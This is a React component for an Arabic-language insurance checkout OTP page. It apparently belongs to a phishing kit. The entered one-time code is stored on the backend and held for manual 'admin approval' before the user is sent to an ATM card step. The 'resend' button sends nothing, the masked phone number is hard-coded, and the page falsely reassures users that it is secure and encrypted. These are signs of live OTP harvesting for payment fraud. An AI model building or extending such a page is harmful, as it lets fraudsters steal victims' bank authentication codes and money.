import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Shield, Lock, RefreshCw, Smartphone, Loader2 } from "lucide-react";
import InsuranceStepper from "@/components/InsuranceStepper";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";

const OTPVerification = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const offer = location.state?.offer;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");

  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [timer, setTimer] = useState(120);
  const [canResend, setCanResend] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const approvalStatus = useAdminApproval(orderId, "otp");

  useEffect(() => { inputRefs.current[0]?.focus(); }, []);

  useEffect(() => {
    if (timer <= 0) { setCanResend(true); return; }
    const id = setInterval(() => setTimer((t) => t - 1), 1000);
    return () => clearInterval(id);
  }, [timer]);

  useEffect(() => {
    if (approvalStatus === "approved") {
      toast.success("تم التحقق بنجاح");
      sessionStorage.setItem("insurance_order_id", orderId!);
      navigate("/insurance/atm", { state: { offer, orderId } });
    } else if (approvalStatus === "rejected") {
      toast.error("تم رفض رمز التحقق");
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer]);

  const handleChange = (i: number, v: string) => {
    if (!/^\d*$/.test(v)) return;
    const n = [...otp]; n[i] = v.slice(-1); setOtp(n);
    if (v && i < 5) inputRefs.current[i + 1]?.focus();
  };

  const handleKeyDown = (i: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[i] && i > 0) inputRefs.current[i - 1]?.focus();
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    const p = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (p.length === 6) { setOtp(p.split("")); inputRefs.current[5]?.focus(); }
  };

  const handleVerify = async () => {
    if (otp.join("").length !== 6) return;
    setLoading(true);
    const id = await createOrUpdateStage(orderId, "otp", { otp_verified: false, otp_code: otp.join("") });
    setOrderId(id);
    setWaitingApproval(true);
  };

  const handleResend = () => {
    setTimer(120); setCanResend(false); setOtp(["", "", "", "", "", ""]);
    inputRefs.current[0]?.focus();
  };

  const fmtTime = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;

  return (
    <div className="min-h-[100dvh] bg-secondary/30">
      <div className="container mx-auto px-3 md:px-4 pt-8 pb-24 md:pb-12">
        <div className="max-w-5xl mx-auto">
          <InsuranceStepper active={2} />
          <div className="max-w-md mx-auto">
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
              <div className="bg-card rounded-2xl border border-border shadow-sm p-5 md:p-8 text-center">
                <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", delay: 0.2 }} className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mx-auto mb-6">
                  <Smartphone className="w-8 h-8 text-primary" />
                </motion.div>

                {waitingApproval ? (
                  <div className="space-y-4 py-4">
                    <Loader2 className="w-10 h-10 text-primary animate-spin mx-auto" />
                    <h3 className="text-sm font-bold text-foreground">بانتظار موافقة الإدارة...</h3>
                    <p className="text-xs text-muted-foreground">يرجى الانتظار حتى تتم مراجعة رمز التحقق</p>
                  </div>
                ) : (
                  <>
                    <h2 className="text-lg md:text-xl font-bold text-foreground mb-2">أدخل رمز التحقق</h2>
                    <p className="text-xs md:text-sm text-muted-foreground mb-1">تم إرسال رمز التحقق المكون من 6 أرقام إلى</p>
                    <p className="text-xs md:text-sm font-bold text-foreground mb-6 md:mb-8 flex items-center justify-center gap-1" dir="ltr">
                      <Lock className="w-3 h-3 text-primary" />05•••••89
                    </p>

                    <div className="flex gap-2 md:gap-2.5 justify-center mb-5 md:mb-6" dir="ltr" onPaste={handlePaste}>
                      {otp.map((digit, i) => (
                        <motion.input key={i} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 + i * 0.05 }}
                          ref={(el) => { inputRefs.current[i] = el; }} type="text" inputMode="numeric" maxLength={1} value={digit}
                          onChange={(e) => handleChange(i, e.target.value)} onKeyDown={(e) => handleKeyDown(i, e)}
                          className={`w-10 h-12 md:w-12 md:h-14 text-center text-lg md:text-xl font-bold rounded-xl border-2 transition-all focus:outline-none ${digit ? "border-primary bg-primary/5 text-primary shadow-sm shadow-primary/10" : "border-border bg-background text-foreground focus:border-primary focus:ring-2 focus:ring-primary/20"}`}
                        />
                      ))}
                    </div>

                    <div className="mb-6">
                      {canResend ? (
                        <button onClick={handleResend} className="flex items-center gap-2 text-sm text-primary hover:text-primary/80 mx-auto font-medium transition-colors">
                          <RefreshCw className="w-4 h-4" />إعادة إرسال الرمز
                        </button>
                      ) : (
                        <div className="inline-flex items-center gap-2 bg-secondary/70 rounded-full px-4 py-1.5">
                          <span className="text-xs text-muted-foreground">إعادة الإرسال خلال</span>
                          <span className="text-sm text-primary font-bold font-mono">{fmtTime(timer)}</span>
                        </div>
                      )}
                    </div>

                    <Button onClick={handleVerify} disabled={loading || otp.join("").length !== 6} className="w-full bg-cta text-cta-foreground hover:bg-cta-hover rounded-xl py-5 font-bold text-sm md:text-base gap-2">
                      <Lock className="w-4 h-4" />{loading ? "جاري التحقق..." : "تأكيد الدفع"}
                    </Button>
                  </>
                )}

                <div className="flex items-center justify-center gap-2 mt-6 pt-4 border-t border-border">
                  <Shield className="w-4 h-4 text-primary/60" />
                  <span className="text-xs text-muted-foreground">عملية آمنة ومشفرة بالكامل</span>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OTPVerification;
